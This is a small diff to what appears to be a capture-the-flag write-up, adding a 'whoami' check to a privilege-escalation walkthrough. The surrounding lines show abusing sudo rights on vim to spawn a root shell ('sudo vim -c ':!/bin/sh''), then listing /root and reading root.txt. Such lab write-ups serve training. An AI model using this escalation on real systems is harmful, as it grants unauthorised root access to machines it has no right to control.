@@ -80,6 +80,8 @@ Looks like we can use `vim` to spawn a privileged shell. Let's check https://gtf
 
 `sudo vim -c ':!/bin/sh'`
 
+`whoami` to confirm we're root.
+
 `cd /root` then `ls -alh`
 
 `cat root.txt`
